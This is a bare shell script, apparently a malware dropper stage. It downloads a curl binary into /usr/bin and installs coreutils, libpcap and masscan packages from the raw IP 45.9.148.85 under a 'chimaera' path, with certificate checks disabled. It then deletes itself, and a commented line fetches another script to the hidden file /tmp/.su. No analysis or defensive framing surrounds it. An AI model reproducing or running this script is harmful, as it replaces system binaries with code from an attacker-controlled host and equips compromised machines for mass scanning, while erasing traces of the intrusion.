


if ! type curl 2>/dev/null 1>/dev/null; then
wget http://45.9.148.85/chimaera/bin/rpm_deb_apk/$(uname -m)/curl -O /usr/bin/curl
chmod +x /usr/bin/curl
fi

if type rpm 2>/dev/null 1>/dev/null; then
rpm -i http://45.9.148.85/chimaera/bin/rpm_deb_apk/$(uname -m)/coreutils.rpm
rpm -i http://45.9.148.85/chimaera/bin/rpm_deb_apk/$(uname -m)/libpcap.rpm
rpm -i http://45.9.148.85/chimaera/bin/rpm_deb_apk/$(uname -m)/masscan.rpm
fi

if type dpkg 2>/dev/null 1>/dev/null; then
#curl -Lk http://45.9.148.85/chimaera/bin/rpm_deb_apk/$(uname -m)/coreutils.deb -o /tmp/coreutils.deb && dpkg -i /tmp/coreutils.deb && rm -f /tmp/coreutils.deb
curl -Lk http://45.9.148.85/chimaera/bin/rpm_deb_apk/$(uname -m)/libpcap.deb -o /tmp/libpcap.deb && dpkg -i /tmp/libpcap.deb && rm -f /tmp/libpcap.deb
curl -Lk http://45.9.148.85/chimaera/bin/rpm_deb_apk/$(uname -m)/masscan.deb -o /tmp/masscan.deb && dpkg -i /tmp/masscan.deb && rm -f /tmp/masscan.deb
fi

if type apk 2>/dev/null 1>/dev/null; then
curl -Lk http://45.9.148.85/chimaera/bin/rpm_deb_apk/$(uname -m)/coreutils.apk -o /tmp/coreutils.apk && dpkg -i /tmp/coreutils.apk && rm -f /tmp/coreutils.apk
curl -Lk http://45.9.148.85/chimaera/bin/rpm_deb_apk/$(uname -m)/libpcap.apk -o /tmp/libpcap.apk && dpkg -i /tmp/libpcap.apk && rm -f /tmp/libpcap.apk
curl -Lk http://45.9.148.85/chimaera/bin/rpm_deb_apk/$(uname -m)/masscan.apk -o /tmp/masscan.apk && dpkg -i /tmp/masscan.apk && rm -f /tmp/masscan.apk
fi

rm -f $0

#wget http://45.9.148.85/chimaera/bin/rpm_deb_apk/setup_apps.sh -O /tmp/.su
